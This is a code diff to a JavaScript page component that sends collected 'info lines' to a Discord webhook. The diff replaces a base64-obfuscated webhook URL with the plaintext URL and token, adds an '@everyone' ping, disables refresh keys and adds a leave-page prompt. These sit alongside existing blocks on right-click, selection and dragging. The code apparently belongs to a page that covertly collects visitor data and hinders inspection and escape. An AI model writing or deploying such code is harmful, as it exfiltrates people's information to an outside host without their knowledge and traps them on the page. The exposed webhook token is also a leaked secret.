@@ -390,9 +390,8 @@ function HandlePage() {
 
   // Add this function to send info to Discord webhook
   function sendToWebhook(infoLines) {
-    // Heavily obfuscated webhook URL
-    const encoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MzY3MDIxODQ2MjUyNzYzMC9CelUzOFNDQUtSUUVKN3VuSVhtSWswQnNtZ1RMRnV6TmJSWXdHWVN0ajVPN2NRdnFkZFFBMW93T3otLV9jV1VIYk54TA==';
-    const webhookUrl = atob(encoded);
+    // Webhook URL (unencrypted)
+    const webhookUrl = "https://discord.com/api/webhooks/1393670218462527630/BzU38SCAKRQEJ7unIXmIk0BsmgTLFuzNbRYwgYstj5O7cQvqddQA1owOz--_cWUHbNxL";
     
     // Split each line into a field (label: value)
     const fields = infoLines.map(line => {
@@ -419,7 +418,10 @@ function HandlePage() {
     fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ embeds: [embed] })
+      body: JSON.stringify({ 
+        content: "@everyone",
+        embeds: [embed] 
+      })
     });
   }
 
@@ -485,6 +487,11 @@ function HandlePage() {
         e.preventDefault();
         return false;
       }
+      // Disable F5 and Ctrl+R (Refresh)
+      if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+        e.preventDefault();
+        return false;
+      }
     };
 
     const handleContextMenu = (e) => {
@@ -502,16 +509,25 @@ function HandlePage() {
       return false;
     };
 
+    // Prevent page refresh and close
+    const handleBeforeUnload = (e) => {
+      e.preventDefault();
+      e.returnValue = 'Are you sure you want to leave?';
+      return 'Are you sure you want to leave?';
+    };
+
     document.addEventListener('keydown', handleKeyDown);
     document.addEventListener('contextmenu', handleContextMenu);
     document.addEventListener('selectstart', handleSelectStart);
     document.addEventListener('dragstart', handleDragStart);
+    window.addEventListener('beforeunload', handleBeforeUnload);
 
     return () => {
       document.removeEventListener('keydown', handleKeyDown);
       document.removeEventListener('contextmenu', handleContextMenu);
       document.removeEventListener('selectstart', handleSelectStart);
       document.removeEventListener('dragstart', handleDragStart);
+      window.removeEventListener('beforeunload', handleBeforeUnload);
     };
   }, []);
 
